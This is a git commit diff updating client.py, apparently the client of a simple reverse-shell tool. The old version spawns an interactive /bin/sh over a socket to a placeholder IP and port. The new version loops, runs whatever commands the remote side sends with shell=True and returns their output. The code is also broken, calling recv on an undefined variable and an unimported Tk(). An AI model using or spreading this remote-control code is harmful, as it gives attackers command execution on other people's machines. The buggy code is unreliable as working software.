c63053e8ecf447c6ecce2926c2bccc73a21fb29c
Mr. MubelBubuel <75030028+Mr-MubelBubel@users.noreply.github.com>
2022-05-02 15:45:50 +0200

    update server and client

--- client.py
+++ client.py
@@ -1,22 +1,36 @@
 #!/usr/python3
 
+from distutils import errors
 import os, socket, subprocess, sys
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("{IP-Adress}", {Port}))
 
-if sys.platform == "win32" or sys.platform == "cygwin":
-    data = s.recv(1024)
+while  True:
+    data.recv(8192)
     if data:
-        cmd = data.decode("utf-8", errors="replace").strip()
-        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        cmd = data.decode("UTF-8", errors="replace").strip()
 
-        STDOUT, STDERR = proc.communicate()
+        if cmd == "tell os":
+            b_arr = bytearray()
+            b_arr.extend(map(ord, sys.platform))
+            s.send(b_arr)
 
-        s.send(STDOUT)
-        s.send(STDERR)
-    else:
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        proc = subprocess.call(["/bin/sh", "-i"])
+        elif cmd == "close":
+            s.send(b"Closing connection")
+            s.close()
+            sys.exit()
+
+        else:
+            proc = subprocess.Popen(cmd, shell=True, \
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, \
+                    stdin=subprocess.PIPE)
+            STDOUT, STDERR = proc.communicate()
+
+            to_send = bytearray()
+            to_send.extend(STDOUT)
+            to_send.extend(STDERR)
+            s.send(to_send)
+
+win = Tk()
+win.mainloop()
